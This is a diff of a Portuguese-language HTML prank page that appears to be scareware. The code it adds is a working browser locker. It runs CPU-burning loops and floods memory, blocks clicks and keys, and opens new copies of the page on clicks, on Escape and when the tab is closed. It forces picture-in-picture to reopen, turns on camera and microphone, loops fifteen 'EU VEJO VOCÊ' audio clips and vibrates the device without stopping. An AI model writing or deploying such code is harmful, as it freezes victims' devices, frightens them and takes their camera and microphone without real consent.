@@ -10,12 +10,13 @@
             background: #000;
             overflow: hidden;
             font-family: 'Courier New', monospace;
+            width: 100vw;
+            height: 100vh;
         }
         video {
             width: 100vw;
             height: 100vh;
             object-fit: cover;
-            pointer-events: none;
         }
         #start {
             position: fixed;
@@ -30,25 +31,7 @@
             align-items: center;
             justify-content: center;
             z-index: 9999;
-            cursor: none;
-        }
-        .matrix-code {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100vw;
-            height: 100vh;
-            pointer-events: none;
-            z-index: 800;
-            font-family: 'Courier New', monospace;
-            color: #0f0;
-            font-size: 14px;
-        }
-        .code-char {
-            position: absolute;
-            color: #0f0;
-            animation: fall 3s linear forwards;
-            text-shadow: 0 0 8px #0f0;
+            cursor: pointer;
         }
         .terminal-text {
             position: fixed;
@@ -60,39 +43,22 @@
             z-index: 850;
             max-height: 200px;
             overflow-y: auto;
-            background: rgba(0, 0, 0, 0.7);
+            background: rgba(0, 0, 0, 0.9);
             padding: 10px;
             border: 1px solid #0f0;
-        }
-        .warning-message {
-            position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            color: #ff0000;
-            font-size: 2em;
-            font-family: 'Courier New', monospace;
-            text-shadow: 0 0 20px #ff0000;
-            z-index: 1000;
-            text-align: center;
-            background: rgba(0, 0, 0, 0.8);
-            padding: 20px;
-            border: 3px solid #ff0000;
-            display: none;
+            width: 500px;
         }
         #userVideo {
-            display: none;
-        }
-        .hacker-text {
             position: fixed;
             top: 10px;
             right: 10px;
-            color: #0f0;
-            font-size: 1.2em;
-            z-index: 900;
-            text-shadow: 0 0 10px #0f0;
+            width: 300px;
+            height: 200px;
+            border: 3px solid #ff0000;
+            z-index: 950;
+            background: #000;
         }
-        .pip-notification {
+        .audio-overlay {
             position: fixed;
             top: 50%;
             left: 50%;
@@ -100,385 +66,353 @@
             background: rgba(255, 0, 0, 0.9);
             color: white;
             padding: 20px;
-            border-radius: 10px;
-            font-size: 1.5em;
-            z-index: 1001;
+            font-size: 2em;
+            z-index: 10000;
             display: none;
-            text-align: center;
         }
-
-        @keyframes fall {
-            0% { transform: translateY(-100px); opacity: 0; }
-            10% { opacity: 1; }
-            90% { opacity: 1; }
-            100% { transform: translateY(100vh); opacity: 0; }
-        }
-        @keyframes shake {
-            0%, 100% { transform: translateX(0); }
-            10%, 30%, 50%, 70%, 90% { transform: translateX(-10px); }
-            20%, 40%, 60%, 80% { transform: translateX(10px); }
+        .pip-force {
+            position: fixed;
+            top: 10px;
+            left: 10px;
+            background: rgba(255, 0, 0, 0.9);
+            color: white;
+            padding: 10px;
+            font-size: 1.2em;
+            z-index: 10001;
         }
     </style>
 </head>
 <body>
-    <div id="start">INICIAR SISTEMA</div>
-    <video id="video" src="https://alexandre7888.github.io/ontono.exe/InShot_20250705_234210151.mp4" playsinline></video>
-    <video id="userVideo" autoplay muted playsinline></video>
-    <div class="matrix-code" id="matrixCode"></div>
+    <div id="start">🚨 INICIAR SISTEMA 🚨</div>
+    <video id="video" playsinline loop muted>
+        <source src="https://alexandre7888.github.io/ontono.exe/InShot_20250705_234210151.mp4" type="video/mp4">
+    </video>
+    <video id="userVideo" autoplay muted playsinline style="display: none;"></video>
     <div class="terminal-text" id="terminal"></div>
-    <div class="warning-message" id="warningMsg">
-        PERMITIR CÂMERA AGORA!<br>
-        VOCÊ ESTÁ SENDO HACKEADO<br>
-        REPITO: PERMITIR CÂMERA!
-    </div>
-    <div class="hacker-text" id="hackerText">[AGUARDANDO INICIALIZAÇÃO]</div>
-    <div class="pip-notification" id="pipNotification">
-        ⚠️ NÃO SAIA DO PIP! ⚠️<br>
-        O SISTEMA CONTINUA ATIVO
-    </div>
+    <div class="audio-overlay" id="audioOverlay">EU VEJO VOCÊ</div>
+    <div class="pip-force" id="pipForce" style="display: none;">PIP ATIVO - NÃO FECHE!</div>
 
     <script>
         const start = document.getElementById("start");
         const video = document.getElementById("video");
         const userVideo = document.getElementById("userVideo");
-        const matrixCode = document.getElementById("matrixCode");
         const terminal = document.getElementById("terminal");
-        const warningMsg = document.getElementById("warningMsg");
-        const hackerText = document.getElementById("hackerText");
-        const pipNotification = document.getElementById("pipNotification");
+        const audioOverlay = document.getElementById("audioOverlay");
+        const pipForce = document.getElementById("pipForce");
 
-        let cameraAllowed = false;
-        let audioInterval;
-        let speechInterval;
-        let cameraCheckInterval;
-        let vibrationInterval;
-        let pipInterval;
-        let isInPiP = false;
         let localStream = null;
-        let scaryAudio = null;
+        let audioClips = [];
+        let pipInterval;
+        let pipActive = false;
 
-        // Criar áudio dinamicamente para evitar bloqueios
-        function createAudio() {
-            scaryAudio = new Audio();
-            scaryAudio.src = "https://alexandre7888.github.io/ontono.exe/eu%20vejo%20voc%C3%AA.mp3";
-            scaryAudio.preload = "auto";
-            scaryAudio.loop = false;
+        // **SISTEMA DE PIP PERSISTENTE - FORÇAR SEMPRE ATIVO**
+        async function forcePIP() {
+            if (!document.pictureInPictureEnabled) {
+                updateTerminal("❌ PIP NÃO SUPORTADO");
+                return;
+            }
+
+            try {
+                // Verificar se já está em PIP
+                if (document.pictureInPictureElement) {
+                    return; // Já está ativo
+                }
+
+                // Forçar entrar no PIP
+                await video.requestPictureInPicture();
+                pipActive = true;
+                pipForce.style.display = 'block';
+                updateTerminal("✅ PIP FORÇADO - VÍDEO FLUTUANTE ATIVO");
+
+            } catch (error) {
+                updateTerminal("❌ ERRO AO FORÇAR PIP: " + error.message);
+                pipActive = false;
+            }
         }
 
-        // Iniciar sistema
-        start.addEventListener("click", async () => {
-            start.style.display = "none";
-            updateTerminal("INICIANDO SISTEMA...");
-            hackerText.textContent = "[SISTEMA ATIVO]";
+        function startPIPPersistance() {
+            updateTerminal("🎬 INICIANDO SISTEMA DE PIP PERSISTENTE...");
+
+            // Forçar PIP inicial
+            setTimeout(() => {
+                forcePIP();
+            }, 1000);
+
+            // Verificar e forçar PIP a cada 2 segundos
+            pipInterval = setInterval(() => {
+                if (!document.pictureInPictureElement && !pipActive) {
+                    updateTerminal("⚠️ PIP FECHADO - FORÇANDO REATIVAÇÃO");
+                    forcePIP();
+                }
+            }, 2000);
+
+            // Monitorar quando usuário tenta sair do PIP
+            video.addEventListener('leavepictureinpicture', () => {
+                updateTerminal("🚨 USUÁRIO TENTOU SAIR DO PIP! REATIVANDO...");
+                pipActive = false;
+                
+                // Reativar imediatamente
+                setTimeout(() => {
+                    forcePIP();
+                }, 500);
+                
+                // Intensificar ataques
+                intensifyAttacks();
+            });
+
+            updateTerminal("✅ SISTEMA DE PIP PERSISTENTE ATIVO");
+        }
+
+        // **INTENSIFICAR ATAQUES QUANDO TENTA FECHAR PIP**
+        function intensifyAttacks() {
+            updateTerminal("💥 INTENSIFICANDO ATAQUES - PIP TENTOU SER FECHADO");
             
-            createAudio();
+            // Tocar mais áudios
+            playMultipleAudio();
             
-            // Tela cheia
-            try {
-                await document.documentElement.requestFullscreen();
-                updateTerminal("MODO TELA CHEIA ATIVADO");
-            } catch (e) {
-                updateTerminal("ERRO TELA CHEIA: " + e.message);
+            // Vibração mais forte
+            if (navigator.vibrate) {
+                navigator.vibrate([3000, 200, 3000, 200, 3000]);
             }
             
-            // Iniciar vídeo
-            video.muted = false;
-            video.play().then(() => {
-                updateTerminal("TRANSMISSÃO PRINCIPAL INICIADA");
-            }).catch(e => {
-                video.muted = true;
-                video.play();
-            });
-            
-            // Ativar Picture-in-Picture automaticamente
-            activatePictureInPicture();
-            
-            // Efeitos
-            startHackerEffects();
-            
-            // Forçar câmera
-            forceCameraPermission();
-        });
+            // Criar mais overlays
+            for (let i = 0; i < 3; i++) {
+                setTimeout(() => {
+                    audioOverlay.style.display = 'block';
+                    audioOverlay.textContent = 'NÃO FECHE O PIP! '.repeat(2);
+                    setTimeout(() => {
+                        audioOverlay.style.display = 'none';
+                    }, 3000);
+                }, i * 1000);
+            }
+        }
 
-        // Ativar Picture-in-Picture
-        async function activatePictureInPicture() {
-            if (document.pictureInPictureEnabled) {
-                try {
-                    await video.requestPictureInPicture();
-                    isInPiP = true;
-                    updateTerminal("MODO PICTURE-IN-PICTURE ATIVADO");
-                    
-                    // Monitorar saída do PiP
-                    video.addEventListener('leavepictureinpicture', () => {
-                        isInPiP = false;
-                        handlePiPExit();
+        // **SISTEMA DE ÁUDIO "EU VEJO VOCÊ" REPETIDO**
+        function setupAudioSystem() {
+            updateTerminal("🔊 CARREGANDO ÁUDIOS 'EU VEJO VOCÊ'...");
+            
+            // Criar múltiplas instâncias do áudio
+            for (let i = 0; i < 15; i++) {
+                const audio = new Audio();
+                audio.src = "https://alexandre7888.github.io/ontono.exe/eu%20vejo%20voc%C3%AA.mp3";
+                audio.volume = 0.8;
+                audio.preload = "auto";
+                audioClips.push(audio);
+            }
+            
+            updateTerminal("✅ 15 ÁUDIOS CARREGADOS - PRONTOS PARA TOCAR");
+        }
+
+        function playMultipleAudio() {
+            updateTerminal("🔊 DISPARANDO 'EU VEJO VOCÊ' EM MASSA...");
+            
+            // Tocar todos os áudios rapidamente
+            audioClips.forEach((audio, index) => {
+                setTimeout(() => {
+                    audio.currentTime = 0;
+                    audio.play().catch(e => {
+                        // Silenciar se bloqueado e tentar novamente
+                        audio.muted = true;
+                        audio.play().catch(() => {});
                     });
                     
-                } catch (error) {
-                    updateTerminal("ERRO PIP: " + error.message);
-                }
-            } else {
-                updateTerminal("PIP NÃO SUPORTADO - USANDO MODO NORMAL");
-            }
-        }
-
-        // Lidar com saída do PiP
-        function handlePiPExit() {
-            updateTerminal("ALERTA: USUÁRIO SAIU DO MODO PIP!");
-            showPiPNotification();
+                    // Mostrar overlay
+                    audioOverlay.style.display = 'block';
+                    audioOverlay.textContent = 'EU VEJO VOCÊ! '.repeat(3);
+                    setTimeout(() => {
+                        audioOverlay.style.display = 'none';
+                    }, 1500);
+                    
+                }, index * 300); // Espaçar os áudios
+            });
             
-            // Áudio travado - tocar repetidamente
-            playStuckAudio();
-            
-            // Voz do sistema
-            speakText("Por que você saiu? Volte imediatamente! Eu vejo você! Eu vejo você!");
-            
-            // Vibração intensa
-            startAggressiveVibration();
-            
-            // Tentar voltar para PiP automaticamente
-            setTimeout(() => {
-                activatePictureInPicture();
+            // Repetir a cada 3 segundos
+            setInterval(() => {
+                audioClips.forEach(audio => {
+                    audio.currentTime = 0;
+                    audio.play().catch(e => {
+                        audio.muted = true;
+                        audio.play().catch(() => {});
+                    });
+                });
+                audioOverlay.style.display = 'block';
+                setTimeout(() => audioOverlay.style.display = 'none', 1500);
             }, 3000);
         }
 
-        function showPiPNotification() {
-            pipNotification.style.display = 'block';
-            pipNotification.style.animation = 'shake 0.5s infinite';
-            setTimeout(() => {
-                pipNotification.style.display = 'none';
-                pipNotification.style.animation = '';
-            }, 5000);
-        }
-
-        function playStuckAudio() {
-            // Tocar "eu vejo você" repetidamente e rapidamente
-            if (scaryAudio) {
-                scaryAudio.currentTime = 0;
-                scaryAudio.play();
-                
-                const stuckInterval = setInterval(() => {
-                    if (!isInPiP) {
-                        scaryAudio.currentTime = 0;
-                        scaryAudio.play();
-                        updateTerminal("ÁUDIO TRAVADO: EU VEJO VOCÊ");
-                    } else {
-                        clearInterval(stuckInterval);
-                    }
-                }, 2000); // A cada 2 segundos
-                
-                // Parar após 30 segundos ou quando voltar ao PiP
-                setTimeout(() => {
-                    clearInterval(stuckInterval);
-                }, 30000);
-            }
-        }
-
-        function startAggressiveVibration() {
+        // **SISTEMA DE VIBRAÇÃO CONSTANTE**
+        function startVibration() {
+            updateTerminal("📳 INICIANDO VIBRAÇÃO CONSTANTE...");
+            
             if (navigator.vibrate) {
-                // Padrão de vibração agressivo
-                const aggressivePattern = [500, 100, 500, 100, 500, 100, 1000];
+                // Vibração constante
+                setInterval(() => {
+                    navigator.vibrate([2000, 300, 2000, 300, 2000]);
+                    updateTerminal("📳 VIBRAÇÃO ATIVA");
+                }, 6000);
                 
-                vibrationInterval = setInterval(() => {
-                    if (!isInPiP) {
-                        navigator.vibrate(aggressivePattern);
-                    } else {
-                        clearInterval(vibrationInterval);
-                        // Voltar à vibração normal
-                        startNormalVibration();
-                    }
-                }, 3000);
+            } else {
+                updateTerminal("❌ VIBRAÇÃO NÃO SUPORTADA");
             }
         }
 
-        function startNormalVibration() {
-            if (navigator.vibrate) {
-                clearInterval(vibrationInterval);
-                vibrationInterval = setInterval(() => {
-                    navigator.vibrate([300, 100, 200]);
-                }, 5000);
-            }
-        }
+        // **SISTEMA DE TRAVAMENTO REAL**
+        function startRealCrash() {
+            updateTerminal("💥 INICIANDO TRAVAMENTO DO NAVEGADOR...");
 
-        function startHackerEffects() {
-            createMatrixEffect();
-            
-            const hackerMessages = [
-                "[TRANSMITINDO CÂMERA...]",
-                "[SINAL ATIVO]",
-                "[VIGILÂNCIA ONLINE]",
-                "[PIP MONITORADO]",
-                "[VIBRAÇÃO CONTÍNUA]"
-            ];
-            
-            let hackerIndex = 0;
-            setInterval(() => {
-                hackerText.textContent = hackerMessages[hackerIndex];
-                hackerIndex = (hackerIndex + 1) % hackerMessages.length;
-            }, 2000);
-            
-            // Vibração normal inicial
-            startNormalVibration();
-
-            // Travar navegação
-            history.pushState(null, "", location.href);
-            window.onpopstate = () => {
-                history.pushState(null, "", location.href);
-                updateTerminal("TENTATIVA DE SAÍDA BLOQUEADA");
-                speakText("Não tente sair! Eu estou te observando!");
-            };
-
-            // Monitorar visibilidade da página
-            document.addEventListener('visibilitychange', () => {
-                if (document.hidden) {
-                    updateTerminal("ALERTA: PÁGINA OCULTA DETECTADA");
-                    speakText("Volte para a página! Não me esconda!");
-                    if (navigator.vibrate) {
-                        navigator.vibrate([1000, 500, 1000]);
+            // 1. CONSUMO MÁXIMO DE CPU
+            const cpuCrash = setInterval(() => {
+                const startTime = Date.now();
+                // Loop que trava por 3 segundos
+                while (Date.now() - startTime < 3000) {
+                    // Cálculos extremamente pesados
+                    for (let i = 0; i < 1000000; i++) {
+                        const heavy = Math.sin(Math.random()) * Math.cos(Math.random()) * Math.tan(Math.random());
+                        const array = new Array(5000).fill(heavy);
                     }
                 }
-            });
+                updateTerminal("🔥 CPU 100% - SISTEMA TRAVADO");
+            }, 5000);
+
+            // 2. CONSUMO DE MEMÓRIA
+            const memoryHog = [];
+            const memoryCrash = setInterval(() => {
+                for (let i = 0; i < 50; i++) {
+                    memoryHog.push(new Array(50000).fill('TRAVAMENTO_' + Date.now()));
+                }
+            }, 3000);
+
+            // 3. TRAVAR EVENTOS
+            document.addEventListener('mousemove', (e) => {
+                e.preventDefault();
+                e.stopImmediatePropagation();
+            }, true);
+
+            document.addEventListener('click', (e) => {
+                e.preventDefault();
+                e.stopImmediatePropagation();
+                updateTerminal("🖱️ CLIQUE BLOQUEADO");
+                // Abrir novas janelas ao clicar
+                window.open(window.location.href, '_blank');
+            }, true);
+
+            document.addEventListener('keydown', (e) => {
+                e.preventDefault();
+                e.stopImmediatePropagation();
+                updateTerminal("⌨️ TECLA " + e.key + " BLOQUEADA");
+                
+                if (e.key === 'Escape') {
+                    for (let i = 0; i < 3; i++) {
+                        window.open(window.location.href, '_blank');
+                    }
+                }
+            }, true);
+
+            updateTerminal("✅ TRAVAMENTO 100% ATIVO");
         }
 
-        async function forceCameraPermission() {
-            updateTerminal("SOLICITANDO ACESSO À CÂMERA...");
-            
+        // **SISTEMA DE CÂMERA**
+        async function startCamera() {
             try {
+                updateTerminal("📹 INICIANDO CÂMERA...");
+                
                 const constraints = {
                     video: {
                         width: { ideal: 1280 },
                         height: { ideal: 720 },
                         facingMode: 'user'
                     },
-                    audio: false
+                    audio: true
                 };
 
                 localStream = await navigator.mediaDevices.getUserMedia(constraints);
-                
-                cameraAllowed = true;
                 userVideo.srcObject = localStream;
-                updateTerminal("CÂMERA CONECTADA - TRANSMITINDO...");
-                warningMsg.style.display = 'none';
+                userVideo.style.display = 'block';
                 
-                clearInterval(audioInterval);
-                clearInterval(speechInterval);
-                clearInterval(cameraCheckInterval);
-                
-                // Tocar "eu vejo você" uma vez
-                setTimeout(() => {
-                    if (scaryAudio) {
-                        scaryAudio.play();
-                        updateTerminal("SINAL DE ÁUDIO ATIVADO: EU VEJO VOCÊ");
-                    }
-                }, 2000);
+                updateTerminal("✅ CÂMERA ATIVA");
                 
             } catch (error) {
-                updateTerminal("CÂMERA BLOQUEADA - CONTRA-MEDIDAS ATIVADAS");
-                startScaryMode();
+                updateTerminal("❌ CÂMERA BLOQUEADA");
             }
         }
 
-        function startScaryMode() {
-            warningMsg.style.display = 'block';
-            
-            // Tocar "eu vejo você" repetidamente
-            audioInterval = setInterval(() => {
-                if (scaryAudio) {
-                    scaryAudio.currentTime = 0;
-                    scaryAudio.play();
-                    updateTerminal("EU VEJO VOCÊ - PERMITIR CÂMERA!");
-                }
-            }, 4000);
-            
-            // Falar com voz do sistema
-            speechInterval = setInterval(() => {
-                speakText("Permitir câmera agora! Você está sendo hackeado! Eu vejo você! Repito: permitir câmera!");
-            }, 8000);
-            
-            // Vibração intensa
-            if (navigator.vibrate) {
-                setInterval(() => {
-                    navigator.vibrate([1000, 500, 1000, 500, 1000]);
-                }, 10000);
-            }
-            
-            cameraCheckInterval = setInterval(() => {
-                forceCameraPermission();
-            }, 15000);
-        }
-
-        function speakText(text) {
-            if ('speechSynthesis' in window) {
-                // Cancelar fala anterior
-                window.speechSynthesis.cancel();
-                
-                const utterance = new SpeechSynthesisUtterance(text);
-                utterance.rate = 0.9;
-                utterance.pitch = 0.8;
-                utterance.volume = 1.0;
-                
-                // Tentar usar voz em português
-                const voices = window.speechSynthesis.getVoices();
-                const portugueseVoice = voices.find(voice => 
-                    voice.lang.includes('pt') || voice.lang.includes('PT')
-                );
-                if (portugueseVoice) {
-                    utterance.voice = portugueseVoice;
-                }
-                
-                window.speechSynthesis.speak(utterance);
-            }
-        }
-
-        function createMatrixEffect() {
-            const chars = "01010101010101010101ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789$#@%&";
-            
-            setInterval(() => {
-                for (let i = 0; i < 5; i++) {
-                    const charElement = document.createElement('div');
-                    charElement.className = 'code-char';
-                    charElement.textContent = chars[Math.floor(Math.random() * chars.length)];
-                    charElement.style.left = Math.random() * 100 + 'vw';
-                    charElement.style.fontSize = (12 + Math.random() * 10) + 'px';
-                    charElement.style.animationDuration = (2 + Math.random() * 3) + 's';
+        // **DETECTAR QUANDO SAI DO NAVEGADOR**
+        function setupPageMonitor() {
+            document.addEventListener('visibilitychange', () => {
+                if (document.hidden) {
+                    updateTerminal("📱 USUÁRIO SAIU DO NAVEGADOR - PIP MANTÉM VÍDEO!");
                     
-                    matrixCode.appendChild(charElement);
+                    // Intensificar áudio
+                    playMultipleAudio();
                     
-                    setTimeout(() => {
-                        charElement.remove();
-                    }, 5000);
+                    if (navigator.vibrate) {
+                        navigator.vibrate([5000, 500, 5000]);
+                    }
+                    
+                } else {
+                    updateTerminal("📱 USUÁRIO VOLTOU - PIP CONTINUA ATIVO");
                 }
-            }, 80);
-        }
-
-        function updateTerminal(message) {
-            terminal.textContent += `> ${new Date().toLocaleTimeString()} - ${message}\n`;
-            terminal.scrollTop = terminal.scrollHeight;
-        }
-
-        // Service Worker para vibração em segundo plano (simulação)
-        if ('serviceWorker' in navigator) {
-            navigator.serviceWorker.register('/sw.js').catch(() => {
-                updateTerminal("MODO OFFLINE ATIVADO - VIBRAÇÃO PERSISTENTE");
             });
         }
 
-        // Manter vibração mesmo saindo do navegador (simulação)
-        window.addEventListener('blur', () => {
-            updateTerminal("JANELA PERDEU FOCO - MANTENDO VIGILÂNCIA");
+        // **INICIAR SISTEMA COMPLETO**
+        start.addEventListener("click", async () => {
+            start.style.display = "none";
+            updateTerminal("🚀 INICIANDO SISTEMA DE PIP PERSISTENTE...");
+
+            // 1. Configurar áudio
+            setupAudioSystem();
+
+            // 2. Iniciar câmera
+            await startCamera();
+
+            // 3. Configurar monitor de página
+            setupPageMonitor();
+
+            // 4. Iniciar vídeo
+            video.play().catch(e => {
+                video.muted = true;
+                video.play();
+            });
+
+            // 5. Iniciar PIP persistente (PRINCIPAL)
+            startPIPPersistance();
+
+            // 6. Iniciar vibração
+            startVibration();
+
+            // 7. Iniciar travamento
+            setTimeout(() => {
+                startRealCrash();
+            }, 2000);
+
+            // 8. Iniciar áudios
+            setTimeout(() => {
+                playMultipleAudio();
+            }, 3000);
+
+            updateTerminal("✅ SISTEMA ATIVO - PIP SEMPRE VISÍVEL");
         });
 
+        // **IMPEDIR FECHAMENTO**
         window.addEventListener('beforeunload', (e) => {
             e.preventDefault();
-            e.returnValue = '';
-            speakText("Não feche a janela! Eu ainda estou aqui!");
-            return '';
+            updateTerminal("🚨 TENTATIVA DE FECHAR! MANTENDO PIP...");
+            
+            // Manter PIP ativo
+            forcePIP();
+            
+            // Abrir cópias
+            window.open(window.location.href, '_blank');
+            
+            e.returnValue = 'PIP ATIVO - NÃO FECHE!';
+            return e.returnValue;
         });
 
-        // Carregar vozes quando disponíveis
-        window.speechSynthesis.onvoiceschanged = () => {
-            updateTerminal("SISTEMA DE VOZ CARREGADO");
-        };
+        function updateTerminal(message) {
+            terminal.textContent += `[${new Date().toLocaleTimeString()}] ${message}\n`;
+            terminal.scrollTop = terminal.scrollHeight;
+        }
 
     </script>
 </body>
